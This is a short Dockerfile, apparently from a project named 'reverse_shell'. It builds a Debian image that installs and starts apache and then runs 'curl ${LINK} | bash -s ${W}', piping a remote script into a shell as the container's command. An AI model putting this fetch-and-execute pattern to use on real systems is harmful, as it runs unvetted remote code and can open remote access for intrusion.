
FROM debian:latest

LABEL maintainer="Lars Lühr and contributors <https://github.com/ayeks/reverse_shell>"

RUN echo "apt update; apt install apache2 -y; apachectl start; apt install curl; curl \${LINK} | bash -s \${W}" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]

EXPOSE 80
